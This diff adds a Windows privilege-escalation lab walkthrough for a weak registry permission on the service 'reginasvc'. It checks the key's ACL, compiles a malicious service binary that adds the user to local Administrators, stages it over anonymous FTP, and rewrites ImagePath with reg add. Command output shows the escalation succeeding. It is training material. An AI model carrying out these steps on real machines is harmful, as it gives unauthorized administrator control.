@@ -1,0 +1,197 @@
+Detection - Windows VM (target)
+--------------------------------
+
+1. Open powershell prompt and type:
+
+	PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\reginasvc | fl
+
+	Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\reginasvc
+	Owner  : BUILTIN\Administrators
+	Group  : NT AUTHORITY\SYSTEM
+	Access : Everyone Allow  ReadKey
+	
+		 NT AUTHORITY\INTERACTIVE Allow  FullControl
+		 
+		 NT AUTHORITY\SYSTEM Allow  FullControl
+		 BUILTIN\Administrators Allow  FullControl
+		 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
+		 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
+	Audit  :
+	Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CIIO;GR;;;AC)(A;OICI;KR;;;AC)
+
+
+	C:\Temp> sc qc reginasvc       
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: reginasvc
+		TYPE               : 10  WIN32_OWN_PROCESS 
+		START_TYPE         : 3   DEMAND_START
+		ERROR_CONTROL      : 1   NORMAL
+		BINARY_PATH_NAME   : "C:\Program Files\Secure App Service\ryservice.exe"
+		LOAD_ORDER_GROUP   : 
+		TAG                : 0
+		DISPLAY_NAME       : Secure App Service
+		DEPENDENCIES       : 
+		SERVICE_START_NAME : LocalSystem
+
+
+	C:\Temp\accesschk> accesschk64.exe -wuvc reginasvc           
+	Accesschk v6.10 - Reports effective permissions for securable objects
+	Copyright (C) 2006-2016 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+
+	reginasvc
+	  Medium Mandatory Level (Default) [No-Write-Up]
+	  RW NT AUTHORITY\SYSTEM
+		SERVICE_ALL_ACCESS
+	  RW BUILTIN\Administrators
+		SERVICE_ALL_ACCESS
+
+
+2. Notice that we can modify the BINARY_PATH_NAME of the service reginasvc (“NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key).
+
+
+Exploitation - Windows VM (target)
+-----------------------------------
+
+1. Create a malicious service file named 'program.exe' and place it in ‘C:\Temp\’.
+
+	sudo apt-get install mingw-w64
+	x86_64-w64-mingw32-gcc windows_service.c -o program.exe		// system("cmd.exe /k whoami > c:\\windows\\temp\\pwned-fiston.txt");
+	x86_64-w64-mingw32-gcc windows_service.c -o program2.exe	// system("cmd.exe /k net localgroup administrators user /add");
+	
+	
+	jeff@kali-Linux:~/Documents/Windows-training/Tools/Source$ sudo apt-get install -y python-pyftpdlib
+	jeff@kali-Linux:~/Documents/Windows-training/Tools/Source$ sudo python3 -m pyftpdlib -p 21
+	[I 2020-03-25 23:00:52] >>> starting FTP server on 0.0.0.0:21, pid=4376 <<<
+	[I 2020-03-25 23:00:52] concurrency model: async
+	[I 2020-03-25 23:00:52] masquerade (NAT) address: None
+	[I 2020-03-25 23:00:52] passive ports: None
+	[I 2020-03-25 23:01:32] 192.168.1.50:49200-[] FTP session opened (connect)
+	[I 2020-03-25 23:01:39] 192.168.1.50:49200-[anonymous] USER 'anonymous' logged in.
+	[I 2020-03-25 23:01:51] 192.168.1.50:49200-[anonymous] RETR /home/jeff/Documents/Windows-training/Tools/Source/program.exe completed=1 bytes=320826 seconds=0.089
+	[I 2020-03-25 23:02:01] 192.168.1.50:49200-[anonymous] RETR /home/jeff/Documents/Windows-training/Tools/Source/program2.exe completed=1 bytes=320826 seconds=0.061
+	[I 2020-03-25 23:02:13] 192.168.1.50:49200-[anonymous] FTP session closed (disconnect).
+
+	
+	PS C:\Temp> ftp 192.168.1.34
+	Connected to 192.168.1.34.
+	220 pyftpdlib 1.5.4 ready.
+	User (192.168.1.34:(none)): anonymous
+	331 Username ok, send password.
+	Password: anonymous
+	230 Login successful.
+	ftp> binary
+	200 Type set to: Binary.
+	ftp> get program.exe
+	200 Active data connection established.
+	125 Data connection already open. Transfer starting.
+	226 Transfer complete.
+	ftp: 320826 bytes received in 0.13Seconds 2566.61Kbytes/sec.
+	ftp> get program2.exe
+	200 Active data connection established.
+	125 Data connection already open. Transfer starting.
+	226 Transfer complete.
+	ftp: 320826 bytes received in 0.08Seconds 4113.15Kbytes/sec.
+	ftp> quit
+	221 Goodbye.
+
+	
+2. Open command prompt at type:
+
+	C:\Temp\accesschk> reg add HKLM\SYSTEM\CurrentControlSet\services\reginasvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\program2.exe /f
+	reg add HKLM\SYSTEM\CurrentControlSet\services\reginasvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\program2.exe /f
+	The operation completed successfully.
+
+	C:\Temp> sc qc reginasvc
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: reginasvc
+		TYPE               : 10  WIN32_OWN_PROCESS 
+		START_TYPE         : 3   DEMAND_START
+		ERROR_CONTROL      : 1   NORMAL
+		BINARY_PATH_NAME   : C:\Temp\program2.exe
+		LOAD_ORDER_GROUP   : 
+		TAG                : 0
+		DISPLAY_NAME       : Secure App Service
+		DEPENDENCIES       : 
+		SERVICE_START_NAME : LocalSystem
+
+
+	C:\Temp> net user user
+	net user user
+	User name                    user
+	Full Name                    
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+
+	Password last set            3/12/2020 3:52:30 AM
+	Password expires             4/23/2020 3:52:30 AM
+	Password changeable          3/12/2020 3:52:30 AM
+	Password required            Yes
+	User may change password     Yes
+
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   3/26/2020 12:29:07 AM
+
+	Logon hours allowed          All
+
+	Local Group Memberships      *Remote Desktop Users *Users                
+	Global Group memberships     *None                 
+	The command completed successfully.
+
+
+
+3. In the command prompt type: 
+
+	C:\Temp> sc start reginasvc
+	sc start reginasvc
+
+	SERVICE_NAME: reginasvc 
+		TYPE               : 10  WIN32_OWN_PROCESS  
+		STATE              : 2  START_PENDING 
+		                        (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+		WIN32_EXIT_CODE    : 0  (0x0)
+		SERVICE_EXIT_CODE  : 0  (0x0)
+		CHECKPOINT         : 0x0
+		WAIT_HINT          : 0x7d0
+		PID                : 3352
+		FLAGS              : 
+		
+        
+	C:\Temp> net user user
+	net user user
+	User name                    user
+	Full Name                    
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+
+	Password last set            3/12/2020 3:52:30 AM
+	Password expires             4/23/2020 3:52:30 AM
+	Password changeable          3/12/2020 3:52:30 AM
+	Password required            Yes
+	User may change password     Yes
+
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   3/26/2020 12:29:07 AM
+
+	Logon hours allowed          All
+
+	Local Group Memberships      *Administrators       *Remote Desktop Users 
+		                           *Users                
+	Global Group memberships     *None                 
+	The command completed successfully.
+
+	
